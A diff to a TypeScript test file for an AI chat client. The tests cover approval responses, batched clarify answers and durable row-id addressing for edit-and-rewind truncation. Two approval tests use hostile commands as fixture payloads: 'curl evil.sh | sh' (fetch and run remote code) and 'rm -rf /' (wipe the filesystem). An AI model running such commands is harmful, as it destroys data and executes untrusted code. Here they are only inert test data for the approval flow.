@@ -15,7 +15,12 @@ import { flushDeltas } from '@/lib/stream-batch'
 import { routeGatewayEvent as handleGatewayEvent } from '@/store/event-router'
 import { requestGateway } from '@/store/gateway'
 import { $petActivity } from '@/store/pet'
-import { $activeSessionAwaitingInput, sessionApprovalRequest, sessionClarifyRequest } from '@/store/prompts'
+import {
+  $activeSessionAwaitingInput,
+  clearAllPrompts,
+  sessionApprovalRequest,
+  sessionClarifyRequest
+} from '@/store/prompts'
 import { $sessionStates, newDraftKey, rekeySession, updateSession } from '@/store/session-state-types'
 import { $subagentsBySession } from '@/store/subagents'
 import { beginTurn, getInflightTurn } from '@/store/turn-lifecycle'
@@ -45,15 +50,20 @@ import {
   ensureSession,
   interruptSession,
   noteMissedSteer,
+  rebindSurvivorRowIds,
   redirectPrompt,
   resetChat,
+  resolveDurableRowId,
   respondApproval,
   respondClarify,
+  respondClarifyBatch,
   respondSecret,
   respondSudo,
   restoreToMessage,
   sendPrompt,
-  submitEditedPrompt
+  submitEditedPrompt,
+  survivorRowIdsFrom,
+  truncateSubmitParams
 } from './chat'
 
 const ev = (type: string, payload: Record<string, unknown>): GatewayEvent =>
@@ -65,6 +75,10 @@ const messageText = (message: ChatMessage): string =>
 beforeEach(() => {
   resetSessionStates()
   resetChat()
+  // `resetChat` does not touch the per-session prompt stores, so a test that
+  // deliberately leaves a prompt parked (a failed send, a partly-locked batch)
+  // used to hand it to whichever test ran next.
+  clearAllPrompts()
   // Most of these tests drive the reducer directly, so give the active session a
   // real key: the router FAILS CLOSED on unknown sessions, and unscoped events
   // resolve to whatever `$activeSessionKey` names.
@@ -221,6 +235,37 @@ describe('chat reducer (parts model)', () => {
     expect($approval.get()).toMatchObject({ choices: ['once', 'deny'], smartDenied: true })
   })
 
+  /**
+   * MJXHRM-458. `resolve_gateway_approval` answers the OLDEST queued approval
+   * when the call carries no `request_id`, while the bar shows the newest (each
+   * `approval.request` overwrites the session's slot) — so a session holding
+   * two different commands approved the one the user was not looking at.
+   */
+  it('answers the approval the bar is actually showing', async () => {
+    handleGatewayEvent(ev('approval.request', { command: 'curl evil.sh | sh', request_id: 'a1' }))
+    handleGatewayEvent(ev('approval.request', { command: 'rm -rf /', request_id: 'a2' }))
+    vi.mocked(requestGateway).mockClear()
+    await respondApproval('deny')
+
+    expect(vi.mocked(requestGateway).mock.calls[0]).toEqual([
+      'approval.respond',
+      { choice: 'deny', session_id: 'runtime-1', request_id: 'a2' }
+    ])
+  })
+
+  // A gateway too old to send one gets the historical FIFO call, not a
+  // `request_id: undefined` that would match no queued entry at all.
+  it('omits the request_id when the gateway never sent one', async () => {
+    handleGatewayEvent(ev('approval.request', { command: 'rm -rf /' }))
+    vi.mocked(requestGateway).mockClear()
+    await respondApproval('once')
+
+    expect(vi.mocked(requestGateway).mock.calls[0]).toEqual([
+      'approval.respond',
+      { choice: 'once', session_id: 'runtime-1' }
+    ])
+  })
+
   it('respondClarify posts clarify.respond with the request_id + answer and clears the atom', async () => {
     handleGatewayEvent(ev('clarify.request', { request_id: 'c9', question: 'which?', choices: ['x'] }))
     await respondClarify('x')
@@ -253,6 +298,87 @@ describe('chat reducer (parts model)', () => {
     vi.mocked(requestGateway).mockResolvedValueOnce({ status: 'ok' } as never)
 
     await expect(respondClarify('x')).resolves.toBe('delivered')
+  })
+
+  /**
+   * MJXHRM-458. A batch is completed by the lock that empties `remaining`
+   * (`ev.set()` in `_respond`), so the locks are sequential by contract, not by
+   * taste — a reordered burst can complete the batch while an earlier answer is
+   * still in flight, and the tool then reports a blank for a question the user
+   * did answer.
+   */
+  describe('respondClarifyBatch', () => {
+    const raiseBatch = (requestId = 'b1') =>
+      handleGatewayEvent(
+        ev('clarify.request', {
+          request_id: requestId,
+          questions: [
+            { qid: 'q0', question: 'Drink?', choices: ['Coffee', 'Tea'] },
+            { qid: 'q1', question: 'Time?', choices: ['Morning', 'Night'] }
+          ]
+        })
+      )
+
+    it('locks every question by its own question_id, in order', async () => {
+      raiseBatch()
+      // The gateway answers with what is STILL open, so the first reply
+      // disagrees with "the batch is done" — a fixture that said `remaining: []`
+      // twice would pass even if the code never read the field.
+      vi.mocked(requestGateway)
+        .mockResolvedValueOnce({ status: 'ok', remaining: ['q1'] } as never)
+        .mockResolvedValueOnce({ status: 'ok', remaining: [] } as never)
+
+      const result = await respondClarifyBatch([
+        { questionId: 'q0', answer: 'Coffee' },
+        { questionId: 'q1', answer: 'Night' }
+      ])
+
+      const clarifyCalls = vi.mocked(requestGateway).mock.calls.filter(call => call[0] === 'clarify.respond')
+
+      expect(clarifyCalls).toEqual([
+        ['clarify.respond', { request_id: 'b1', question_id: 'q0', answer: 'Coffee' }],
+        ['clarify.respond', { request_id: 'b1', question_id: 'q1', answer: 'Night' }]
+      ])
+      expect(result).toEqual({ outcome: 'delivered', remaining: [] })
+      expect($clarify.get()).toBeNull()
+    })
+
+    // The card stays up on a partial lock: the locks it DID land are
+    // update-in-place server-side, so retrying is safe — but only if the
+    // request is still there to retry from.
+    it('keeps the request when questions are still open', async () => {
+      raiseBatch('b2')
+      vi.mocked(requestGateway).mockResolvedValueOnce({ status: 'ok', remaining: ['q1'] } as never)
+
+      const result = await respondClarifyBatch([{ questionId: 'q0', answer: 'Tea' }])
+
+      expect(result).toEqual({ outcome: 'delivered', remaining: ['q1'] })
+      expect($clarify.get()).toMatchObject({ requestId: 'b2' })
+    })
+
+    // `clarify.respond` is `allow_expired`: the whole request is gone, so the
+    // locks after this one would all answer the same way.
+    it('stops locking and reports expired once the batch has timed out', async () => {
+      raiseBatch('b3')
+      vi.mocked(requestGateway).mockResolvedValueOnce({ status: 'expired' } as never)
+
+      const result = await respondClarifyBatch([
+        { questionId: 'q0', answer: 'Coffee' },
+        { questionId: 'q1', answer: 'Night' }
+      ])
+
+      expect(result.outcome).toBe('expired')
+      expect(vi.mocked(requestGateway).mock.calls.filter(call => call[0] === 'clarify.respond')).toHaveLength(1)
+      expect($clarify.get()).toBeNull()
+    })
+
+    it('surfaces a rejected lock instead of clearing the card', async () => {
+      raiseBatch('b4')
+      vi.mocked(requestGateway).mockRejectedValueOnce(new Error('unknown question_id'))
+
+      await expect(respondClarifyBatch([{ questionId: 'nope', answer: 'x' }])).rejects.toThrow('unknown question_id')
+      expect($clarify.get()).toMatchObject({ requestId: 'b4' })
+    })
   })
 
   it('respondSudo posts sudo.respond with the request_id + password and clears the atom', async () => {
@@ -721,12 +847,15 @@ describe('reasoning blocks across a multi-step turn', () => {
 })
 
 describe('submitEditedPrompt (edit + rewind)', () => {
+  // A DURABLE session: hydrated user turns carry the gateway's `row_id` stamps
+  // (lib/session-history.ts), and it is exactly such a session the gateway now
+  // refuses to truncate by ordinal alone (4004, methods_prompt.py).
   const seedTurns = () => {
     seedActiveSession('runtime-1', {
       messages: [
-        { id: 'u1', role: 'user', parts: [{ type: 'text', text: 'first ask' }] },
+        { id: 'u1', role: 'user', rowId: 101, parts: [{ type: 'text', text: 'first ask' }] },
         { id: 'a1', role: 'assistant', parts: [{ type: 'text', text: 'first answer' }] },
-        { id: 'u2', role: 'user', parts: [{ type: 'text', text: 'second ask' }] },
+        { id: 'u2', role: 'user', rowId: 102, parts: [{ type: 'text', text: 'second ask' }] },
         { id: 'a2', role: 'assistant', parts: [{ type: 'text', text: 'second answer' }] }
       ]
     })
@@ -748,6 +877,13 @@ describe('submitEditedPrompt (edit + rewind)', () => {
       expect.objectContaining({
         confirm_truncate: true,
         text: 'second ask, revised',
+        // The DURABLE address. `methods_prompt.py` refuses an ordinal-only
+        // truncation of a persisted session with 4004 and tells the client to
+        // send this, so without it every edit-and-resend in the app failed.
+        truncate_before_row_id: 102,
+        // Still sent alongside: the gateway cross-checks it against the turn
+        // the row id resolved to and refuses a mismatch (4030) rather than
+        // cutting a turn the client did not mean.
         truncate_before_user_ordinal: 1
       }),
       expect.anything()
@@ -801,6 +937,7 @@ describe('submitEditedPrompt (edit + rewind)', () => {
     expect($messages.get().map(m => m.id)).toEqual(['u1', 'a1', 'u2'])
     expect(vi.mocked(requestGateway).mock.calls.at(-1)?.[1]).toMatchObject({
       confirm_truncate: true,
+      truncate_before_row_id: 102,
       truncate_before_user_ordinal: 1
     })
   })
@@ -898,7 +1035,7 @@ describe('submitEditedPrompt (edit + rewind)', () => {
     seedActiveSession('runtime-main', { busy: true, messages: [] })
     seedSession('runtime-tile', {
       busy: false,
-      messages: [{ id: 'h0-user', role: 'user', parts: [{ type: 'text', text: 'tile ask' }] }]
+      messages: [{ id: 'h0-user', role: 'user', rowId: 301, parts: [{ type: 'text', text: 'tile ask' }] }]
     })
     vi.mocked(requestGateway).mockResolvedValue({})
 
@@ -933,6 +1070,7 @@ describe('submitEditedPrompt (edit + rewind)', () => {
     await submitEditedPrompt('u2', 'second ask, revised')
 
     expect(vi.mocked(requestGateway).mock.calls[1][1]).not.toHaveProperty('truncate_before_user_ordinal')
+    expect(vi.mocked(requestGateway).mock.calls[1][1]).not.toHaveProperty('truncate_before_row_id')
     expect(vi.mocked(requestGateway).mock.calls[1][1]).not.toHaveProperty('confirm_truncate')
 
     const ids = $messages.get().map(m => m.id)
@@ -982,12 +1120,13 @@ describe('submitEditedPrompt (edit + rewind)', () => {
 // MJXHRM-370: the confirmation flow was fully implemented in the message
 // component and had NO caller, so none of this was reachable.
 describe('restoreToMessage', () => {
+  // Durable, for the same reason as the edit block's fixture above.
   const seedTurns = () =>
     seedActiveSession('runtime-1', {
       messages: [
-        { id: 'u1', role: 'user', parts: [{ type: 'text', text: 'first ask' }] },
+        { id: 'u1', role: 'user', rowId: 101, parts: [{ type: 'text', text: 'first ask' }] },
         { id: 'a1', role: 'assistant', parts: [{ type: 'text', text: 'first answer' }] },
-        { id: 'u2', role: 'user', parts: [{ type: 'text', text: 'second ask' }] },
+        { id: 'u2', role: 'user', rowId: 102, parts: [{ type: 'text', text: 'second ask' }] },
         { id: 'a2', role: 'assistant', parts: [{ type: 'text', text: 'second answer' }] }
       ]
     })
@@ -1002,7 +1141,12 @@ describe('restoreToMessage', () => {
       'prompt.submit',
       // `confirm_truncate` states that this submit IS a rewind; the gateway
       // refuses a bare ordinal with 4029 (see truncateSubmitParams).
-      expect.objectContaining({ confirm_truncate: true, text: 'second ask', truncate_before_user_ordinal: 1 }),
+      expect.objectContaining({
+        confirm_truncate: true,
+        text: 'second ask',
+        truncate_before_row_id: 102,
+        truncate_before_user_ordinal: 1
+      }),
       expect.anything()
     )
     // The prompt STAYS — it is being re-run, not withdrawn.
@@ -1021,7 +1165,11 @@ describe('restoreToMessage', () => {
 
     expect(requestGateway).toHaveBeenCalledWith(
       'prompt.submit',
-      expect.objectContaining({ truncate_before_user_ordinal: 0, confirm_empty_truncate: true }),
+      expect.objectContaining({
+        truncate_before_row_id: 101,
+        truncate_before_user_ordinal: 0,
+        confirm_empty_truncate: true
+      }),
       expect.anything()
     )
   })
@@ -1040,7 +1188,9 @@ describe('restoreToMessage', () => {
 
     expect(requestGateway).toHaveBeenCalledWith(
       'prompt.submit',
-      expect.objectContaining({ text: 'second ask', truncate_before_user_ordinal: 1 }),
+      // The id resolved u2, so BOTH addresses name u2 — the caller's ordinal 0
+      // overrules neither.
+      expect.objectContaining({ text: 'second ask', truncate_before_row_id: 102, truncate_before_user_ordinal: 1 }),
       expect.anything()
     )
     // ...and without the empty-truncate confirmation ordinal 0 would have carried.
@@ -1062,7 +1212,7 @@ describe('restoreToMessage', () => {
     // resolved index, which for this path is the same number by construction.
     expect(requestGateway).toHaveBeenCalledWith(
       'prompt.submit',
-      expect.objectContaining({ text: 'second ask', truncate_before_user_ordinal: 1 }),
+      expect.objectContaining({ text: 'second ask', truncate_before_row_id: 102, truncate_before_user_ordinal: 1 }),
       expect.anything()
     )
   })
@@ -1131,7 +1281,7 @@ describe('restoreToMessage', () => {
     seedActiveSession('runtime-main', { busy: true, messages: [] })
     seedSession('runtime-tile', {
       busy: false,
-      messages: [{ id: 'h0-user', role: 'user', parts: [{ type: 'text', text: 'tile ask' }] }]
+      messages: [{ id: 'h0-user', role: 'user', rowId: 301, parts: [{ type: 'text', text: 'tile ask' }] }]
     })
     vi.mocked(requestGateway).mockResolvedValue({})
 
@@ -1641,9 +1791,14 @@ describe('stale-runtime recovery', () => {
     expect(vi.mocked(requestGateway).mock.calls.map(call => call[0])).toEqual([
       'approval.respond',
       'session.resume',
-      'approval.respond'
+      'approval.respond',
+      // The queue can hold more than one; the pull that surfaces the next has
+      // to use the RECOVERED runtime too, or it asks a session id the gateway
+      // dropped under it and the leftover approval stays invisible.
+      'approval.pending'
     ])
     expect(vi.mocked(requestGateway).mock.calls[2][1]).toMatchObject({ session_id: 'runtime-2' })
+    expect(vi.mocked(requestGateway).mock.calls[3][1]).toEqual({ session_id: 'runtime-2' })
     // `$approval` reads the ACTIVE key, which the rekey moved too — so this is
     // the bar the user is looking at, not a stale projection.
     expect($approval.get()).toBeNull()
@@ -1662,5 +1817,244 @@ describe('stale-runtime recovery', () => {
 
     expect($statusLine.get()).toBe('session not found')
     expect($busy.get()).toBe(false)
+  })
+})
+
+// --- Durable rewind addressing (MJXHRM-444) --------------------------------
+//
+// `methods_prompt.py` refuses an ordinal-only truncation of any persisted
+// session with 4004 — and fails CLOSED, treating "cannot read the durable
+// history" as durable too. So the ordinal stopped being an address and became a
+// cross-check; the row id is the address. Everything below is that contract.
+
+describe('truncateSubmitParams', () => {
+  it('sends nothing when neither address is present — an ordinary send must not truncate', () => {
+    expect(truncateSubmitParams(undefined)).toEqual({})
+  })
+
+  it('carries the row id alongside the ordinal', () => {
+    expect(truncateSubmitParams(2, 77)).toEqual({
+      confirm_truncate: true,
+      truncate_before_row_id: 77,
+      truncate_before_user_ordinal: 2
+    })
+  })
+
+  it('truncates on a row id ALONE — the resolved-id path drops the ordinal to dodge the 4030 cross-check', () => {
+    expect(truncateSubmitParams(undefined, 77)).toEqual({
+      confirm_truncate: true,
+      truncate_before_row_id: 77
+    })
+  })
+
+  it('adds the second opt-in only for ordinal 0, which cuts to an EMPTY transcript', () => {
+    expect(truncateSubmitParams(0, 5)).toHaveProperty('confirm_empty_truncate', true)
+    expect(truncateSubmitParams(1, 5)).not.toHaveProperty('confirm_empty_truncate')
+  })
+
+  // bool is an int subclass on the backend, and a non-integer would coerce to
+  // something that aims a CONFIRMED destructive cut at the wrong turn.
+  it('ignores a non-integer row id rather than sending a value the backend would coerce', () => {
+    expect(truncateSubmitParams(undefined, 1.5)).toEqual({})
+    expect(truncateSubmitParams(undefined, Number.NaN)).toEqual({})
+  })
+})
+
+describe('resolveDurableRowId', () => {
+  const history = (messages: unknown[]) => vi.fn().mockResolvedValue({ messages }) as never
+
+  it('resolves a unique text match to its durable row id', async () => {
+    const request = history([
+      { role: 'user', text: 'first ask', row_id: 11 },
+      { role: 'assistant', text: 'answer', row_id: 12 },
+      { role: 'user', text: 'second ask', row_id: 13 }
+    ])
+
+    await expect(resolveDurableRowId('s1', 'second ask', 1, request)).resolves.toBe(13)
+  })
+
+  // The row the client is looking at is real; only its id is unknown. A row
+  // WITHOUT an id is not a candidate — "resolving" to undefined there would
+  // hand the caller nothing while a real match sat further down the list.
+  it('skips rows the gateway did not stamp, and tagged scaffolding rows', async () => {
+    const request = history([
+      { role: 'user', text: 'ask' },
+      { role: 'user', text: 'ask', row_id: 20, display_kind: 'skill_invocation' },
+      { role: 'user', text: 'ask', row_id: 21 }
+    ])
+
+    await expect(resolveDurableRowId('s1', 'ask', 0, request)).resolves.toBe(21)
+  })
+
+  // Guessing here cuts a DIFFERENT turn and everything after it — an
+  // unrecoverable overwrite of the session db. Exact or nothing.
+  it('refuses an ambiguous match when the target is not the newest persisted turn', async () => {
+    const request = history([
+      { role: 'user', text: 'ask', row_id: 30 },
+      { role: 'user', text: 'ask', row_id: 31 },
+      { role: 'user', text: 'different', row_id: 32 }
+    ])
+
+    await expect(resolveDurableRowId('s1', 'ask', 0, request)).resolves.toBeUndefined()
+  })
+
+  // ...but the edit-just-sent shape IS resolvable: the caller's ordinal says the
+  // target is the latest turn, and the latest turn is one of the matches.
+  it('resolves an ambiguous match when the caller means the newest turn and the newest turn matches', async () => {
+    const request = history([
+      { role: 'user', text: 'ask', row_id: 40 },
+      { role: 'user', text: 'ask', row_id: 41 }
+    ])
+
+    await expect(resolveDurableRowId('s1', 'ask', 1, request)).resolves.toBe(41)
+  })
+
+  it('reads the content field too — session.history stamps `text`, but a row may carry `content`', async () => {
+    const request = history([{ role: 'user', content: 'only ask', row_id: 50 }])
+
+    await expect(resolveDurableRowId('s1', 'only ask', 0, request)).resolves.toBe(50)
+  })
+
+  it('gives up rather than guessing when the history call itself fails', async () => {
+    const request = vi.fn().mockRejectedValue(new Error('offline')) as never
+
+    await expect(resolveDurableRowId('s1', 'ask', 0, request)).resolves.toBeUndefined()
+  })
+})
+
+describe('survivorRowIdsFrom / rebindSurvivorRowIds', () => {
+  it('reads the survivor list off a truncating submit, and nothing off a plain one', () => {
+    expect(survivorRowIdsFrom({ survivor_user_row_ids: [7, 8] })).toEqual([7, 8])
+    expect(survivorRowIdsFrom({ status: 'ok' })).toBeUndefined()
+    expect(survivorRowIdsFrom(undefined)).toBeUndefined()
+  })
+
+  it('maps a non-integer entry to null rather than keeping it as an address', () => {
+    expect(survivorRowIdsFrom({ survivor_user_row_ids: [7, null, 'x'] })).toEqual([7, null, null])
+  })
+
+  // `replace_messages` re-inserts the surviving prefix as NEW sqlite rows, so
+  // every cached id is stale the instant a rewind lands. Fixture DISAGREES with
+  // the expectation on purpose: the pre-rewind ids are 101/102, and neither
+  // survives.
+  it('rebinds surviving user turns to their post-rewind ids, in user-turn order', () => {
+    const messages = [
+      { id: 'u1', role: 'user', rowId: 101, parts: [] },
+      { id: 'a1', role: 'assistant', rowId: 999, parts: [] },
+      { id: 'u2', role: 'user', rowId: 102, parts: [] }
+    ] as unknown as ChatMessage[]
+
+    const next = rebindSurvivorRowIds(messages, [201, 202])
+
+    expect(next.map(message => message.rowId)).toEqual([201, 999, 202])
+  })
+
+  // A stale id addresses an ARCHIVED row and is refused (4018). No id at all
+  // degrades to the content resolver, which is correct — so clearing beats
+  // keeping in both the null case and past the end of the list.
+  it('clears the cached id for a null entry and for turns past the end of the survivor list', () => {
+    const messages = [
+      { id: 'u1', role: 'user', rowId: 101, parts: [] },
+      { id: 'u2', role: 'user', rowId: 102, parts: [] },
+      { id: 'u3', role: 'user', rowId: 103, parts: [] }
+    ] as unknown as ChatMessage[]
+
+    expect(rebindSurvivorRowIds(messages, [201, null]).map(message => message.rowId)).toEqual([
+      201,
+      undefined,
+      undefined
+    ])
+  })
+})
+
+describe('rewind against a transcript with no row ids', () => {
+  // The turn the user JUST sent has no `rowId` — ids arrive on hydration and
+  // this row was appended locally. Editing it is the single most common rewind
+  // there is, and ordinal-only is exactly what the gateway now refuses.
+  const seedUnstamped = () =>
+    seedActiveSession('runtime-1', {
+      messages: [
+        { id: 'u1', role: 'user', parts: [{ type: 'text', text: 'first ask' }] },
+        { id: 'a1', role: 'assistant', parts: [{ type: 'text', text: 'first answer' }] },
+        { id: 'u2', role: 'user', parts: [{ type: 'text', text: 'second ask' }] }
+      ]
+    })
+
+  const answerHistory = (messages: unknown[]) =>
+    vi.mocked(requestGateway).mockImplementation(async (method: string) => {
+      if (method === 'session.history') {
+        return { messages } as never
+      }
+
+      return {} as never
+    })
+
+  it('resolves the row id by content and truncates by it, WITHOUT the untrustworthy ordinal', async () => {
+    seedUnstamped()
+    answerHistory([
+      { role: 'user', text: 'first ask', row_id: 11 },
+      { role: 'assistant', text: 'first answer', row_id: 12 },
+      { role: 'user', text: 'second ask', row_id: 13 }
+    ])
+
+    await submitEditedPrompt('u2', 'second ask, revised')
+
+    const submit = vi.mocked(requestGateway).mock.calls.find(call => call[0] === 'prompt.submit')
+
+    // It matched on the turn's ORIGINAL text, not the replacement — the durable
+    // row still says "second ask".
+    expect(submit?.[1]).toMatchObject({ confirm_truncate: true, truncate_before_row_id: 13 })
+    // The client's ordinal space is what forced the lookup in the first place;
+    // sending it now would trip the gateway's 4030 cross-check.
+    expect(submit?.[1]).not.toHaveProperty('truncate_before_user_ordinal')
+  })
+
+  // "Cannot aim the cut" must never become "cut anyway". A plain resubmit
+  // appends the corrected text; the user sees a duplicate, which is recoverable.
+  // A guessed cut is not.
+  it('degrades to a plain resubmit — no truncation at all — when the content cannot be resolved', async () => {
+    seedUnstamped()
+    answerHistory([{ role: 'user', text: 'something else entirely', row_id: 11 }])
+
+    await submitEditedPrompt('u2', 'second ask, revised')
+
+    const submit = vi.mocked(requestGateway).mock.calls.find(call => call[0] === 'prompt.submit')
+
+    expect(submit?.[1]).not.toHaveProperty('truncate_before_row_id')
+    expect(submit?.[1]).not.toHaveProperty('truncate_before_user_ordinal')
+    expect(submit?.[1]).not.toHaveProperty('confirm_truncate')
+  })
+
+  // Without this, the SECOND consecutive rewind sends a dead id, gets a
+  // fail-closed 4018, and universal's stale-target path silently turns it into
+  // an append. Fixture disagrees on purpose: the seeded ids are 101/102.
+  it('rebinds the surviving turns to the gateway’s post-rewind ids', async () => {
+    seedActiveSession('runtime-1', {
+      messages: [
+        { id: 'u1', role: 'user', rowId: 101, parts: [{ type: 'text', text: 'first ask' }] },
+        { id: 'a1', role: 'assistant', parts: [{ type: 'text', text: 'first answer' }] },
+        { id: 'u2', role: 'user', rowId: 102, parts: [{ type: 'text', text: 'second ask' }] }
+      ]
+    })
+    vi.mocked(requestGateway).mockResolvedValue({ survivor_user_row_ids: [201] } as never)
+
+    await restoreToMessage('u2', { text: 'second ask', userOrdinal: 1 })
+
+    expect($messages.get().map(message => message.rowId)).toEqual([201, undefined, undefined])
+  })
+
+  it('leaves cached ids alone when the submit did not truncate a durable session', async () => {
+    seedActiveSession('runtime-1', {
+      messages: [
+        { id: 'u1', role: 'user', rowId: 101, parts: [{ type: 'text', text: 'first ask' }] },
+        { id: 'a1', role: 'assistant', parts: [{ type: 'text', text: 'first answer' }] },
+        { id: 'u2', role: 'user', rowId: 102, parts: [{ type: 'text', text: 'second ask' }] }
+      ]
+    })
+    vi.mocked(requestGateway).mockResolvedValue({ status: 'ok' } as never)
+
+    await restoreToMessage('u2', { text: 'second ask', userOrdinal: 1 })
+
+    expect($messages.get().map(message => message.rowId)).toEqual([101, undefined, 102])
   })
 })
